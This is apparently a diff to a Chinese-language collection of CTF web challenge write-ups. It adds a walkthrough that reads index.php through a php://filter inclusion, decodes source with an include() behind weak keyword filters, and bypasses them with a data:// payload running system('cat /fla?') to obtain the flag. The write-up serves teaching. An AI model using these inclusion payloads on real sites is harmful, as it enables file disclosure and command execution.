@@ -6710,7 +6710,7 @@ b'aW5kZXgucGhw'
 <img src='data:image/png;base64,PD9waHAKLyoKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyBAQXV0aG9yOiBoMXhhCiMgQERhdGU6ICAgMjAyMy0wMy0yNyAxMDozMDozMAojIEBMYXN0IE1vZGlmaWVkIGJ5OiAgIGgxeGEKIyBATGFzdCBNb2RpZmllZCB0aW1lOiAyMDIzLTAzLTI4IDEyOjE1OjMzCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQojIEBsaW5rOiBodHRwczovL2N0ZmVyLmNvbQoKKi8KCiRpbWFnZT0kX0dFVFsnaW1nJ107CgokZmxhZyA9ICJjdGZzaG93ezNhOWEyYTA2LTFlNmUtNDFmMS05NDU0LTk2N2E1MGIyODEyZH0iOwppZihpc3NldCgkaW1hZ2UpKXsKCSRpbWFnZSA9IGJhc2U2NF9kZWNvZGUoJGltYWdlKTsKCSRkYXRhID0gYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cygkaW1hZ2UpKTsKCWVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL3BuZztiYXNlNjQsJGRhdGEnLz4iOwp9ZWxzZXsKCSRpbWFnZSA9IGJhc2U2NF9lbmNvZGUoImZhY2UucG5nIik7CgloZWFkZXIoImxvY2F0aW9uOi8/aW1nPSIuJGltYWdlKTsKfQoKCgoK'/>
 ```
 
-直接在`cmd`用`php -r "var_dump(base64_decode())"`对其进行`base64`解码，可以看到`flag`变量。
+直接在`cmd`用`php -r "var_dump(base64_decode(''));"`对其进行`base64`解码，可以看到`flag`变量。
 
 ```php
 C:\Users\tyd>php -r "var_dump(base64_decode('PD9waHAKLyoKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyBAQXV0aG9yOiBoMXhhCiMgQERhdGU6ICAgMjAyMy0wMy0yNyAxMDozMDozMAojIEBMYXN0IE1vZGlmaWVkIGJ5OiAgIGgxeGEKIyBATGFzdCBNb2RpZmllZCB0aW1lOiAyMDIzLTAzLTI4IDEyOjE1OjMzCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQojIEBsaW5rOiBodHRwczovL2N0ZmVyLmNvbQoKKi8KCiRpbWFnZT0kX0dFVFsnaW1nJ107CgokZmxhZyA9ICJjdGZzaG93ezNhOWEyYTA2LTFlNmUtNDFmMS05NDU0LTk2N2E1MGIyODEyZH0iOwppZihpc3NldCgkaW1hZ2UpKXsKCSRpbWFnZSA9IGJhc2U2NF9kZWNvZGUoJGltYWdlKTsKCSRkYXRhID0gYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cygkaW1hZ2UpKTsKCWVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL3BuZztiYXNlNjQsJGRhdGEnLz4iOwp9ZWxzZXsKCSRpbWFnZSA9IGJhc2U2NF9lbmNvZGUoImZhY2UucG5nIik7CgloZWFkZXIoImxvY2F0aW9uOi8/aW1nPSIuJGltYWdlKTsKfQoKCgoK'));"
@@ -11646,6 +11646,86 @@ flag{7ddce3afd760b48f93ffeab618d4626b}
 ```
 
 提交`flag{7ddce3afd760b48f93ffeab618d4626b}`即可。
+
+------
+
+### 简单的Include
+
+> 题目描述：听说你很会读文件？我把门（目录遍历）焊死了，窗户（关键词过滤）也封了。笔给你，你来写（payload）。
+
+进入靶机后，访问`/?page=php://filter/read=convert.base64-encode/resource=index.php`获取`base64`编码后的`index.php`。
+
+```
+PCFkb2N0eXBlIGh0bWw+DQo8aHRtbCBsYW5nPSJ6aC1DTiI+DQo8aGVhZD4NCgk8bWV0YSBjaGFyc2V0PSJ1dGYtOCIgLz4NCgk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLGluaXRpYWwtc2NhbGU9MSIgLz4NCgk8dGl0bGU+Q1RGIFdlYiBDaGFsbGVuZ2U8L3RpdGxlPg0KCTxzdHlsZT4NCgkJYm9keSB7IGZvbnQtZmFtaWx5OiAtYXBwbGUtc3lzdGVtLEJsaW5rTWFjU3lzdGVtRm9udCwiU2Vnb2UgVUkiLFJvYm90byxIZWx2ZXRpY2EsQXJpYWw7IGJhY2tncm91bmQ6IzBmMTcyNDsgY29sb3I6I2U2ZWVmODsgbWFyZ2luOjA7IH0NCgkJLmhlYWRlciB7IGJhY2tncm91bmQ6bGluZWFyLWdyYWRpZW50KDkwZGVnLCMwZWE1YTYsIzYzNjZmMSk7IHBhZGRpbmc6MjBweDsgfQ0KCQkuaGVhZGVyIGgxIHsgbWFyZ2luOjA7IGZvbnQtc2l6ZToyMHB4OyB9DQoJCS5jb250YWluZXIgeyBtYXgtd2lkdGg6OTAwcHg7IG1hcmdpbjozMHB4IGF1dG87IHBhZGRpbmc6MjBweDsgYmFja2dyb3VuZDojMDcxMDIwOyBib3JkZXItcmFkaXVzOjhweDsgYm94LXNoYWRvdzowIDZweCAxOHB4IHJnYmEoMiw2LDIzLDAuNik7IH0NCgkJLm5hdiB7IG1hcmdpbjoxMnB4IDA7IH0NCgkJLm5hdiBhIHsgY29sb3I6I2NmZWVmZTsgdGV4dC1kZWNvcmF0aW9uOm5vbmU7IG1hcmdpbi1yaWdodDoxMnB4OyBwYWRkaW5nOjZweCAxMHB4OyBib3JkZXItcmFkaXVzOjZweDsgYmFja2dyb3VuZDpyZ2JhKDI1NSwyNTUsMjU1LDAuMDMpOyB9DQoJCS5jb250ZW50IHsgcGFkZGluZzoxMnB4IDZweDsgYmFja2dyb3VuZDpyZ2JhKDI1NSwyNTUsMjU1LDAuMDIpOyBib3JkZXItcmFkaXVzOjZweDsgbWluLWhlaWdodDoxMjBweDsgfQ0KCQkuZm9vdGVyIHsgbWFyZ2luLXRvcDoxOHB4OyBmb250LXNpemU6MTNweDsgY29sb3I6IzhmYTZiZDsgfQ0KCQkubm90aWNlIHsgZm9udC1zaXplOjEzcHg7IGNvbG9yOiNmZmQ1ODA7IH0NCgk8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHk+DQoJPGhlYWRlciBjbGFzcz0iaGVhZGVyIj4NCgkJPGgxPkNURiBXZWIgQ2hhbGxlbmdlPC9oMT4NCgk8L2hlYWRlcj4NCgk8bWFpbiBjbGFzcz0iY29udGFpbmVyIj4NCgkJPG5hdiBjbGFzcz0ibmF2Ij4NCgkJCTxhIGhyZWY9Ij9wYWdlPWhvbWUucGhwIj5Ib21lPC9hPg0KCQkJPGEgaHJlZj0iP3BhZ2U9YWJvdXQucGhwIj5BYm91dDwvYT4NCgkJPC9uYXY+DQoNCgkJPHNlY3Rpb24gY2xhc3M9ImNvbnRlbnQiPg0KPD9waHANCiRwYWdlID0gJF9HRVRbJ3BhZ2UnXTsNCmlmIChpc3NldCgkcGFnZSkpIHsNCiAgICAvLyBXQUYgMTog56aB5q2i55uu5b2V6YGN5Y6GDQogICAgaWYgKHN0cnBvcygkcGFnZSwgIi4uIikgIT09IGZhbHNlKSB7DQogICAgICAgIGRpZSgiPGRpdiBjbGFzcz0nbm90aWNlJz5IYWNrZXIgZGV0ZWNlZCEgW05vIFRyYXZlcnNhbF08L2Rpdj4iKTsNCiAgICB9DQoNCiAgICAvLyBXQUYgMjog56aB5q2i55u05o6l6K+75Y+WZmxhZw0KICAgIGlmIChzdHJwb3MoJHBhZ2UsICJmbGFnIikgIT09IGZhbHNlKSB7DQogICAgICAgIGRpZSgiPGRpdiBjbGFzcz0nbm90aWNlJz5IYWNrZXIgZGV0ZWNlZCEgW05vIEZsYWddPC9kaXY+Iik7DQogICAgfQ0KDQogICAgLy8g5ryP5rSe54K5DQogICAgaW5jbHVkZSgkcGFnZSk7DQoNCn0gZWxzZSB7DQogICAgZWNobyAiPGgyPuasoui/juWPguWKoCBDVEY8L2gyPiI7DQogICAgZWNobyAnPHA+6L+Z5piv5LiA5Liq566A5Y2V55qEIFdlYiDmjJHmiJjnjq/looPjgILor7fpgJrov4flr7zoiKrpgInmi6nnu4PkuaDpobXpnaLjgII8L3A+JzsNCiAgICBlY2hvICc8ZGl2IGNsYXNzPSJmb290ZXIiPuazqOaEj++8muivt+mBteW+quinhOWIme+8jOS4jeimgeWwneivlemdnuazleiuv+mXruezu+e7n+aWh+S7tuOAgjwvZGl2Pic7DQp9DQo/Pg0KCQk8L3NlY3Rpb24+DQoJPC9tYWluPg0KPC9ib2R5Pg0KPC9odG1sPg==
+```
+
+直接在`cmd`用`php -r "var_dump(base64_decode(''));"`对其进行`base64`解码，分析`index.php`。
+
+```html
+string(1957) "<!doctype html>
+<html lang="zh-CN">
+<head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width,initial-scale=1" />
+        <title>CTF Web Challenge</title>
+        <style>
+                body { font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial; background:#0f1724; color:#e6eef8; margin:0; }
+                .header { background:linear-gradient(90deg,#0ea5a6,#6366f1); padding:20px; }
+                .header h1 { margin:0; font-size:20px; }
+                .container { max-width:900px; margin:30px auto; padding:20px; background:#071020; border-radius:8px; box-shadow:0 6px 18px rgba(2,6,23,0.6); }
+                .nav { margin:12px 0; }
+                .nav a { color:#cfeefe; text-decoration:none; margin-right:12px; padding:6px 10px; border-radius:6px; background:rgba(255,255,255,0.03); }
+                .content { padding:12px 6px; background:rgba(255,255,255,0.02); border-radius:6px; min-height:120px; }
+                .footer { margin-top:18px; font-size:13px; color:#8fa6bd; }
+                .notice { font-size:13px; color:#ffd580; }
+        </style>
+</head>
+<body>
+        <header class="header">
+                <h1>CTF Web Challenge</h1>
+        </header>
+        <main class="container">
+                <nav class="nav">
+                        <a href="?page=home.php">Home</a>
+                        <a href="?page=about.php">About</a>
+                </nav>
+
+                <section class="content">
+<?php
+$page = $_GET['page'];
+if (isset($page)) {
+    // WAF 1: 禁止目录遍历
+    if (strpos($page, "..") !== false) {
+        die("<div class='notice'>Hacker deteced! [No Traversal]</div>");
+    }
+
+    // WAF 2: 禁止直接读取flag
+    if (strpos($page, "flag") !== false) {
+        die("<div class='notice'>Hacker deteced! [No Flag]</div>");
+    }
+
+    // 漏洞点
+    include($page);
+
+} else {
+    echo "<h2>欢迎参加 CTF</h2>";
+    echo '<p>这是一个简单的 Web 挑战环境。请通过导航选择练习页面。</p>';
+    echo '<div class="footer">注意：请遵循规则，不要尝试非法访问系统文件。</div>';
+}
+?>
+                </section>
+        </main>
+</body>
+</html>
+```
+
+可以看到靶机禁止直接读取`flag`，那我们通过`data://text/plain`来读取`flag`。
+
+```
+/?page=data://text/plain,<?php%20system(%27cat%20/fla?%27)?>
+```
+
+得到`flag{4334b3a9e0ea32e2554f55e9658435a1}`，提交即可。
 
 ------
 
